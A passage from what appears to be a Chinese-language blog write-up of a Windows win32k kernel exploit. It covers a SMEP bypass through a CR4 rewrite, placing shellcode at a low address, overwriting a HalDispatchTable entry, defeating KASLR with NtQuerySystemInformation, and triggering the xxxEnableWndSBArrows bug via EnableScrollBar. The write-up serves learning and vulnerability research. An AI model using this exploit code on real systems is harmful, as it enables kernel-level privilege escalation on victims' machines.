    ULONG_PTR newcr4 = 0x406f8;
    NtQueryIntervalProfile(shellcodeaddress, (PULONG)&newcr4);
你可以在`mov cr4, rax`此处下断点,
    [+] 你会发现此时的rax刚好是我们`NtQueryIntervalProfile`函数的第二个参数.
    [+] 你会发现ret的地址是我们shellcode地址的一半.
        ==> 比如shellcode为 3000 0000 0000 0000
        ==> ret指令时候[rsp] == 0000 0000(shellcode的后一半)
造成这种不幸的原因是什么呢, 我们查看exp代码这个地方的汇编代码, 长这样:
    NtQueryIntervalProfile(0x100300, (PULONG)&newcr4);
    00007FF77DCB200A  lea         rdx,[newcr4]  
    00007FF77DCB200F  mov         ecx,100300h  ==> 注意这里是ecx
    00007FF77DCB2014  call        qword ptr [NtQueryIntervalProfile (07FF77DCC3EB0h)]  
问题出在传入的寄存器是`ecx(32 bit)`, 而不是`rcx(64 bit)` 这个地方返回地址我们可控的是32位, 而我们的exp是64位,
也就是shellcode地址是64位的. `pwn2town`上介绍了一种我完全看不懂的方法(由于这个原因, 我尝试过其他的`SMEP BYPASS`).
所以在经过漫长的失眠之后, 我换了另外一个思路.
    //    [+] 0x100000 这个地址存放shellcode
    //    [+] ecx可以将这个值完整的传入
    void * p = (void*)0x100000;    
    p = VirtualAlloc(p, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memset(p, 0x41, 0x1000);
    CopyMemory((VOID*)0x100300, shellCode, 0x200);    //现在shellcode32位可表示地址了.
在我的源码最后, 我加了这么几句, 来恢复堆栈平衡和修复cr4寄存器(不能瞎改内核的东西, 借完之后借的还回去)
    sub rsp,30h
    mov rax, 0fffff8020074af75h
    mov [rsp], rax    //这一部分恢复堆栈
    ret
如果你惊讶于30等值是如何检测出来的, 你可以利用你的windbg, 动态调试来修复就可以了.
而`0fffff8020074af75h`是由于ROP的时候返回地址被破坏了, 我一开始采用虚拟机把它记作一个常量. 后来用获取基地址的计数把它替换掉了,
具体的你可以查看我的源码.
### 修改nt!haldisptachtable函数指针数组第二项.
由于windbg的存在, 我们可以假设我们已经拥有了`write-what-where`的功能. So, 如果是要完成将第二项改为shellcode的地址.
那我们第一件要做的事, 势必是去找到他. 调试器中我们很机智的用`dqs`就找到了, 但是在代码当中如何来实现呢. 源代码当中我是这样实现的
    ULONG_PTR getHalDispatchtableAddress()
    {
        GetKernelImageBase();    // 获取kernel base address
        HMODULE hNtosMod = LoadLibrary("ntoskrnl.exe");
        ULONG lNtHalDispatchTableOffset = (ULONG)GetProcAddress(hNtosMod, "HalDispatchTable") - (ULONG)hNtosMod;
        nt_HalDispatchTable = (ULONG_PTR)pKernelBase + lNtHalDispatchTableOffset + 8;
        return nt_HalDispatchTable;    // 返回第二项的地址.
    }
首先, 我们假设我们经过GetKernelImageBase函数获取到了”ntoskrnl.exe”加载在内存当中的基地址,
并把它赋值给了pKernelBase变量(后面我们会让这个假设成为真实). 上面的代码获取nt!haldispatchTable在内核当中的地址的思路是:
    [+] 先LoadLibrary装载ntoskrnl.exe到user space. 获取其基地址(hNtosMod)
    [+] 获取HalDispatchTable在user space的地址(GetProcAddress)
    [+] 获取ntosknrl.exe在内核当中的地址(pKernelBase)
    [+] 用内核基地址加上偏移算出nt!haldispatchtable在内核当中的地址
好了, 让我们来获取`pKernelBase`.
### 获取pKernelBase
windows加了`地址随机化(KASLR)`. 所以每次开机重新加载的时候. `ntoskrnl.exe`在内核当中的基地址都不一样. 这一部分,
其实我的个人建议是, 直接保存一个虚拟机镜像, 这样`KASLR`就已经被绕过了. 直接拷出每个函数在这个镜像当中的地址, 然后直接使用,
把后面的做完了再来绕过`KASLR`. 算是一点我个人调试的小`trick`, anyway, 让我们来看一下如何找到内核当中的`ntoskrnl`的镜像.
    VOID GetKernelImageBase()
    {
        [...]
        PSYSTEM_MODULE_INFORMATION Modules = {};
        Modules= (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
        NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, Modules, len, &len);// 需要注意的是SystemModuleInformation的这个常量. 这个参数的功能决定NtQuerySystemInformation的功能.
        // 循环遍历 获取kernel imagebase address
        for (int i = 0; iCount; i++) 
            if (strstr(Modules->Module[i].ImageName, "ntoskrnl.exe") != 0)
                pKernelBase = Modules->Module[i].Base;
    }
我的学习是在r00k1ts大大的[这篇文章](https://r00tk1ts.github.io/2018/02/01/%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B9%8B%E4%BB%BB%E6%84%8F%E4%BD%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E5%86%99/)找到了答案,
获取基地址的思路如下.
    [+] 指定一个SystemModuleInformation类, 
    [+] 调用windows提供的未文档化的NtQuerySystemInformation函数
    [+] 获取到一个加载的模块列表以及他们各自的基地址（包括NT内核）
    [+] 循环遍历每一个module, 比较其模块名字是否含"ntoskrnl.exe". 如果是, 说明基地址找到.
### 漏洞利用.
哇, 走到这里, 万事OK, 现在我们所欠缺的, 只是如何构造一个`write_what_where`而已. 由于`NCC
Group`的老师已经做了很多的工作. 所以逆向这一部分我其实没有做多少, 主要的工作是因为自己的`poc`触发不了, 然后做了一点点修改.
主要利用的技巧如下:
    [+] 借用NCC Group的论文进行理解
    [+] 动态调试到关键的数据点, 判断是否正确
## 分析
在某个阳光明媚的下午, 我把这份代码重新分析了一遍. 构造`POC`的过程我们分为以下三步:
    [+] 定位漏洞点
    [+] 使用xref确定POC触发的函数
    [+] 动态调试及静态分析, 使程序流抵达漏洞点
### 定位漏洞点
定位漏洞点这一部分的工作应该是由补丁比较来做的. 由于这是初学的过程, 所以我们直接使用`NCC Group`的结论.
让我们来看看我们的漏洞的代码.
    // 部分代码省略掉
    // win32k!xxxEnableWndSBArrows()
    __int64 __fastcall xxxEnableWndSBArrows(struct tagWND *pwnd, int wsbFlags, int wArrows)
    {
        [...]
        psbInfo = (int *)*((_QWORD *)pwnd + 22);
        iwArrows = wArrows;
        iWsbFlag = wsbFlags;
        pwndWndCopy = pwnd;
        [...]
        if ( !iWsbFlag || iWsbFlag == 3 )    // 判断其是否为SB_HORZ或者SB_BOTH类型
        {
            [...]
            if ( *((_BYTE *)pwndWndCopy + 40) & 4 ) 
            {
                if ( !(*((_BYTE *)pwndWndCopy + 55) & 0x20) && IsVisible(pwndWndCopy) )    
                xxxDrawScrollBar(v13, v10, 0);    // 线段起始地点1
                                                // 这个地方通过回调使程序流回到用户模式
            }
            [...]
        }
        if ( !((iWsbFlag - 1) & 0xFFFFFFFD) )
        {
            *psbInfo = iwArrows ? 4 * iwArrows | *psbInfo : *psbInfo & 0xFFFFFFF3;    // 线段结束地址二
                                                                                    // 这里假设psbInfo的结构大小为2
                                                                                    // 运算之后变成0xe
        }
        [...]
    }
这里需要记住(记住的意思是先不用理解, 可以慢慢看下去理解)的信息有:
    [+] 漏洞的函数位于win32k, 即win32k!xxxEnableWndSBArrows
    [+] xxxDrawScrollBar当中存在一次用户回调, 可以回到user mode
    [+] 我们需要利用的是线段结束地址二的操作来完成任意读写
### 用户层触发
用户层触发我们得借用我们可爱的`IDA`的`Xref`功能.
我选用的是`NtUserEnableScrollBar`来进行触发(这个分析是之后做的, 我exp的实现是早期的工作. 所以和原来有一些不同.
不过思路是一样的.). 调用`NtUserEnableScrollBar`函数使用的`system call table`表.
在一点简单的改造之后, 我们很轻松的触发了这个函数.
### 抵达漏洞点
#### NtUserEnableScrollBar
在`NtUserEnableScrollBar`函数当中我们需要抵达`xxxEnableScrollBar`函数我们才能到达漏洞点. 相关的检测如下:
##### @1处
`@1`处我们的`ValidateHwnd`函数主要是为了检测传入的窗口句柄(HWND)是否为正确的句柄类.
所以只要`CreateWindow`返回的句柄即可. 需要注意的是, 该函数返回该`HWND`在内核当中对应的`tagWND`结构体的指针.
##### @2处
`@2`处需要结合下面的图片来看.
有关`fnid`的细节你可以参考[这篇文章](http://mista.nu/blog/?p=6),
在做完`cve-2018-8453`之后我会重新介绍它.
    [+] fnid与 NtUserMessageCall 函数关联, 通过该函数可以调用`system calss procedure`.
    [+] fnid也可用于衡量一个system class procedure函数是否被成功初始化.
##### @3处
@3同上
很好, 逆向这一部分的工作, 你可以查看我上传的IDB文件观察细节, ncc gourp里面也给了详细的解释. 这里我先给出另外一个函数.
    [+] EnableScrollBar(hwndVulA, SB_CTL | SB_BOTH, ESB_DISABLE_BOTH); // 此函数用于触发漏洞函数.
微软给出这个函数的解释如下:
    [+] EnableScrollBar函数用于启用或者仅用滚动条的光标
三个参数与漏洞函数的三个参数关系如下.
    [+] hwndVulA ==> pwnd对应的漏洞窗口句柄.
        ==> 微软解释: Handle to a window or a scroll bar control, depending on the value of the wSBflags parameter
    [+] SB_CTL | SB_BOTH ==> wsbFlags
        ==> SB_CTL : 定义此滚动条是一个滚动控件 2
        ==> SB_BOTH: 启用光标和禁用光标的行为针对垂直滚动条和横向滚动条 3
    [+] ESB_DISABLE_BOTH ==> wArrows
        ==> 把两个滚动条都禁用.
So, 前面讲了这么多和我们的漏洞有什么关系呢, 针对一个滚动条控件窗口, 首先由一个`tagWND`窗口来装载(第一个参数pwndWnd),
期间有一个psbInfo结构体. 如下:
    kd> dt win32k!tagWND -b pSBInfo
           +0x0b0 pSBInfo : Ptr64 tagSBINFO
psbInfo存储滚动条的相关信息, 定义如下:
    kd> dt win32k!tagSBINFO -r
    +0x000 WSBflags         : Int4B
    +0x004 Horz             : tagSBDATA